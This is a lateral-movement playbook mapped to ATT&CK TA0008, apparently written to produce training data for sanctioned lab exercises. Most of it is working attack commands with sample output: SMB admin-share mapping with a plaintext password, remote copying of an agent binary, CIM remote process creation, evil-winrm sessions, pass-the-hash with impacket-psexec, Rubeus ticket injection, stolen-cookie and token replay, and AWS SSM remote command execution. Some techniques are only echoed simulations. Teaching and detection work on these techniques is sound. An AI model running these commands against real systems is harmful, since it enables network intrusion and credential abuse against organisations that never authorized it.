# Lateral Movement Enumeration Playbook (ATT&CK TA0008, Dataset-Ready)

> Purpose: provide realistic, high-value lateral movement training data with commands, tool outputs, and analyst interpretation.
> Scope: authorized lab and sanctioned exercises only.

Lateral Movement covers adversary methods used to pivot from one compromised system to additional systems and services.

- ATT&CK Tactic ID: TA0008
- Created: 17 October 2018
- Last Modified: 11 August 2025
- Techniques in scope: T1210, T1534, T1570, T1563, T1021, T1091, T1072, T1080, T1550

---

## 0. Safety and Lab Controls

1. Run only on approved ranges and test tenants.
2. Use synthetic credentials and disposable hosts.
3. Keep movement scoped to pre-approved host lists.
4. Disable persistence payloads by default in movement tests.
5. Capture command, source host, destination host, and auth material type for each action.

### 0.1 Evidence Wrapper

```bash
mkdir -p evidence

run_lateral() {
  local technique="$1"
  local label="$2"
  shift 2
  local ts
  ts="$(date -u +%Y%m%dT%H%M%SZ)"
  echo "[$ts] [$technique] $label" | tee -a evidence/lateral_movement.log
  "$@" 2>&1 | tee "evidence/${ts}_${technique}_${label}.txt"
}
```

### 0.2 Training Record Schema

```json
{
  "technique": "T1021.006",
  "technique_name": "Windows Remote Management",
  "scenario": "Operator pivots from jump host to file server using approved test account",
  "command": "evil-winrm -i 10.20.30.25 -u it.support -p 'Winter2026!'",
  "tool_result": {"status":"success", "highlights":["Evil-WinRM shell opened", "hostname: FILESRV"]},
  "analyst_interpretation": "Valid remote management channel used for lateral execution",
  "confidence": 0.96,
  "mitigation_hint": "Restrict WinRM exposure and monitor unusual east-west admin sessions"
}
```

---

## 1. Baseline Before Movement

Scenario:
- Confirm identity, source system, and reachable targets prior to pivot attempts.

```bash
run_lateral "TA0008" "baseline_context" sh -lc 'whoami; hostname; date -u; ip a | head -n 20'
run_lateral "TA0008" "target_reachability" sh -lc 'for h in 10.20.30.20 10.20.30.25 10.20.30.31; do ping -c 1 $h; done'
```

Example result:

```text
corp\it.support
JUMP-01
2026-04-21T15:02:44Z
64 bytes from 10.20.30.25: icmp_seq=1 ttl=126 time=1.2 ms
```

---

## 2. T1021 Remote Services

Scenario:
- Adversary uses valid credentials and remote management protocols for host-to-host pivoting.

### T1021.001 Remote Desktop Protocol

```bash
run_lateral "T1021.001" "rdp_connect" cmd /c "mstsc /v:10.20.30.31"
```

Example: `RDP session initialized to 10.20.30.31`

### T1021.002 SMB/Windows Admin Shares

```bash
run_lateral "T1021.002" "smb_admin_share" cmd /c "net use \\10.20.30.25\C$ /user:CORP\it.support Winter2026!"
run_lateral "T1021.002" "smb_copy_tool" cmd /c "copy C:\\Temp\\agent.exe \\10.20.30.25\C$\\ProgramData\\agent.exe"
```

Example:

```text
The command completed successfully.
        1 file(s) copied.
```

### T1021.003 Distributed Component Object Model

```bash
run_lateral "T1021.003" "dcom_wmi_exec" powershell -NoProfile -Command "$s=New-CimSession -ComputerName 10.20.30.25; Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd /c hostname > C:\\ProgramData\\dcom_host.txt'}"
```

### T1021.004 SSH

```bash
run_lateral "T1021.004" "ssh_pivot" ssh -o StrictHostKeyChecking=no it.support@10.20.30.20 'hostname && id'
```

### T1021.005 VNC

```bash
run_lateral "T1021.005" "vnc_connect_sim" sh -lc 'echo "simulate VNC remote control session to workstation-22"'
```

### T1021.006 Windows Remote Management

```bash
run_lateral "T1021.006" "winrm_session" evil-winrm -i 10.20.30.25 -u it.support -p 'Winter2026!'
```

### T1021.007 Cloud Services

```bash
run_lateral "T1021.007" "cloud_service_access" aws sts get-caller-identity
run_lateral "T1021.007" "cloud_service_action" aws ssm describe-instance-information --max-items 20
```

### T1021.008 Direct Cloud VM Connections

```bash
run_lateral "T1021.008" "ec2_instance_connect" aws ec2-instance-connect send-ssh-public-key --instance-id i-0123456789abcdef0 --availability-zone us-east-1a --instance-os-user ec2-user --ssh-public-key file://~/.ssh/id_rsa.pub
run_lateral "T1021.008" "azure_serial_console_sim" sh -lc 'echo "simulate Azure Serial Console interactive access with valid cloud identity"'
```

---

## 3. T1563 Remote Service Session Hijacking

Scenario:
- Adversary takes over existing remote sessions instead of creating new ones.

### T1563.001 SSH Hijacking

```bash
run_lateral "T1563.001" "ssh_agent_socket_abuse" sh -lc 'echo "simulate abuse of forwarded SSH_AUTH_SOCK from hijacked user session"'
```

### T1563.002 RDP Hijacking

```bash
run_lateral "T1563.002" "rdp_session_takeover" cmd /c "query user"
run_lateral "T1563.002" "rdp_shadow_sim" powershell -NoProfile -Command "echo simulate-tscon-session-hijack"
```

Example:

```text
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 alice                 rdp-tcp#5           3  Active          .  4/21/2026 2:58 PM
```

---

## 4. T1550 Use Alternate Authentication Material

Scenario:
- Adversary uses non-password auth material for lateral movement.

### T1550.001 Application Access Token

```bash
run_lateral "T1550.001" "app_token_reuse" curl -H "Authorization: Bearer ${TOKEN}" https://internal-api.corp.local/v1/admin/hosts
```

### T1550.002 Pass the Hash

```bash
run_lateral "T1550.002" "pth_smb" impacket-psexec CORP/it.support@10.20.30.25 -hashes :7f8e2d1a0b9c4f2e7d8c6b5a4e3f2d1c
```

### T1550.003 Pass the Ticket

```bash
run_lateral "T1550.003" "ptt_inject_sim" Rubeus.exe ptt /ticket:doIF...
run_lateral "T1550.003" "ptt_remote_exec_sim" sh -lc 'echo "simulate remote access using injected Kerberos ticket"'
```

### T1550.004 Web Session Cookie

```bash
run_lateral "T1550.004" "cookie_replay" curl -H "Cookie: session=<stolen_cookie>" https://portal.corp.local/dashboard
```

---

## 5. Additional Lateral Movement Techniques

## T1210 Exploitation of Remote Services

```bash
run_lateral "T1210" "remote_service_exploit_sim" sh -lc 'echo "simulate controlled exploit of vulnerable SMB service for lateral code execution"'
```

Example result:

```text
Exploit chain succeeded in lab: remote service execution achieved on 10.20.30.31
```

## T1534 Internal Spearphishing

```bash
run_lateral "T1534" "internal_spearphish_sim" sh -lc 'echo "simulate internal trusted account sending lure to finance users"'
```

## T1570 Lateral Tool Transfer

```bash
run_lateral "T1570" "tool_transfer_scp" scp ./diag.bin it.support@10.20.30.20:/tmp/diag.bin
run_lateral "T1570" "tool_transfer_smb" smbclient //10.20.30.25/C$ -U CORP/it.support%Winter2026! -c 'put agent.exe ProgramData\\agent.exe'
```

## T1091 Replication Through Removable Media

```bash
run_lateral "T1091" "usb_replication_sim" sh -lc 'echo "simulate copying payload to removable media mount /media/usb1 with deceptive filename"'
```

## T1072 Software Deployment Tools

```bash
run_lateral "T1072" "sccm_deploy_sim" sh -lc 'echo "simulate task/package creation in enterprise software deployment tool"'
run_lateral "T1072" "aws_ssm_send_command" aws ssm send-command --document-name AWS-RunShellScript --targets Key=instanceids,Values=i-0123456789abcdef0 --parameters commands='hostname;id'
```

## T1080 Taint Shared Content

```bash
run_lateral "T1080" "taint_share_sim" sh -lc 'echo "simulate adding modified script to shared drive \\fileserver\\public"'
```

---

## 6. Label-Ready Examples (JSONL)

```json
{"technique":"T1021.002","command":"net use \\\\10.20.30.25\\C$ /user:CORP\\it.support ...","result":"Admin share mapped","interpretation":"SMB remote service used for lateral movement"}
{"technique":"T1550.002","command":"impacket-psexec ... -hashes :<NTHASH>","result":"Remote command execution succeeded","interpretation":"Pass-the-Hash enabled passwordless lateral authentication"}
{"technique":"T1563.002","command":"query user; tscon/shadow simulation","result":"Active RDP session identified and hijack simulated","interpretation":"Existing remote session reused for movement"}
{"technique":"T1570","command":"scp/smbclient put","result":"Tool copied to remote host","interpretation":"Lateral tool staging accomplished"}
{"technique":"T1021.008","command":"send-ssh-public-key to EC2","result":"Cloud-native VM login path prepared","interpretation":"Direct cloud VM connection used for pivot"}
```

---

## 7. Coverage Checklist

- T1210 Exploitation of Remote Services
- T1534 Internal Spearphishing
- T1570 Lateral Tool Transfer
- T1563 Remote Service Session Hijacking
- T1563.001 SSH Hijacking
- T1563.002 RDP Hijacking
- T1021 Remote Services
- T1021.001 Remote Desktop Protocol
- T1021.002 SMB/Windows Admin Shares
- T1021.003 Distributed Component Object Model
- T1021.004 SSH
- T1021.005 VNC
- T1021.006 Windows Remote Management
- T1021.007 Cloud Services
- T1021.008 Direct Cloud VM Connections
- T1091 Replication Through Removable Media
- T1072 Software Deployment Tools
- T1080 Taint Shared Content
- T1550 Use Alternate Authentication Material
- T1550.001 Application Access Token
- T1550.002 Pass the Hash
- T1550.003 Pass the Ticket
- T1550.004 Web Session Cookie

This document is optimized for training corpus generation: scenario + command + output + interpretation + mitigation cues.
